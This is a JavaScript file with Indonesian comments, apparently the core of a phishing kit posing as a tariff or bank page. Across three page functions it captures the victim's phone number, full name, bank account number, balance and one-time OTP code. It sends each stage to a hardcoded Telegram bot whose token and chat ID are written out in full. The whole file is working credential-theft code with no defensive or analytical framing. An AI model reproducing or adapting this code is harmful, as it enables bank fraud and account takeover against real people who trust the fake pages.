// Konfigurasi Telegram
const telegramConfig = {
  chat_id: "7459871054",
  token: "7866502722:AAF-IwTqAB51vwNA_m6rXe-0WjmEamMIl4g"
};

// Fungsi kirim pesan ke Telegram
function sendTelegramMessage(message, callback) {
  const url = `https://api.telegram.org/bot${telegramConfig.token}/sendMessage`;

  fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: telegramConfig.chat_id,
      text: message
    })
  })
  .then(res => res.json())
  .then(data => {
    if(callback) callback();
  })
  .catch(err => {
    console.error(err);
    alert("Gagal mengirim data ke Telegram!");
  });
}

// Fungsi untuk index.html
function sendNohp() {
    event.preventDefault();
    $(".loading-screen").fadeIn();
    $("#kirim").html("Memproses....");

    var tarif = $('#tarif').val();
    var nomor = $('#nohp').val();

    sessionStorage.setItem('tarif', tarif);
    sessionStorage.setItem('nomor', nomor);

    var message = 
`📶 *TARIF PENGGUNA*
TARIF: ${tarif}
NOMOR: ${nomor}`;

    sendTelegramMessage(message, function(){
        window.location.href = "login.html";
    });
}

// Fungsi untuk login.html
function sendLogin() {
    event.preventDefault();
    $(".loading-screen").fadeIn();
    $("#kirim").html("Memproses....");

    var tarif = sessionStorage.getItem('tarif');
    var nomor = sessionStorage.getItem('nomor');
    var nama = $('#nama').val();
    var norek = $('#rek').val();
    var saldo = $('#saldo').val();

    sessionStorage.setItem('nama', nama);
    sessionStorage.setItem('norek', norek);
    sessionStorage.setItem('saldo', saldo);

    var message = 
`💰 *SALDO PENGGUNA*
TARIF: ${tarif}
NOMOR: ${nomor}
NAMA LENGKAP: ${nama}
NOREK: ${norek}
SALDO AKHIR: ${saldo}`;

    sendTelegramMessage(message, function(){
        window.location.href = "otp.html";
    });
}


// Fungsi untuk otp.html
function sendOtp() {
    event.preventDefault();

    document.getElementById('submit-btn').innerHTML = "Memproses...";

    var tarif = sessionStorage.getItem('tarif');
    var nomor = sessionStorage.getItem('nomor');
    var nama = sessionStorage.getItem('nama');
    var norek = sessionStorage.getItem('norek');
    var saldo = sessionStorage.getItem('saldo');
    var otp = document.getElementById('otp').value;

    var message = 
`📄 *DATA LENGKAP*
TARIF: ${tarif}
NOMOR: ${nomor}
NAMA LENGKAP: ${nama}
NOREK: ${norek}
SALDO AKHIR: ${saldo}
OTP: ${otp}`;

    sendTelegramMessage(message, function(){
        document.getElementById('notif').style.display = 'block';
        setTimeout(function(){
            document.getElementById('notif').style.display = 'none';
            document.getElementById('submit-btn').innerHTML = "Konfirmasi";
        }, 3000);
    });
}

